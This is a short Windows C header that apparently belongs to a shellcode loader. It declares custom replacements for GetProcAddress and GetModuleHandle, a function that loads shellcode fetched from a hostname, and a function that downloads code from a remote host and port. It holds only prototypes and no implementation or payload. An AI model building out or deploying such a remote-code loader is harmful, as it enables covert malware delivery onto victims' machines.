#include "windows.h"

FARPROC GetProcAddressReplacement(IN HMODULE hModule, IN LPCSTR lpApiName);
BOOL IsStringEqual(IN LPCWSTR Str1, IN LPCWSTR Str2);
HMODULE GetModuleHandleReplacement(IN LPCWSTR szModuleName);
int self_load_shellcode(LPCWSTR hostname, LPCWSTR bin);
int fetchCode(wchar_t hostname[], wchar_t file[], wchar_t port[], unsigned char** buffer, DWORD* size);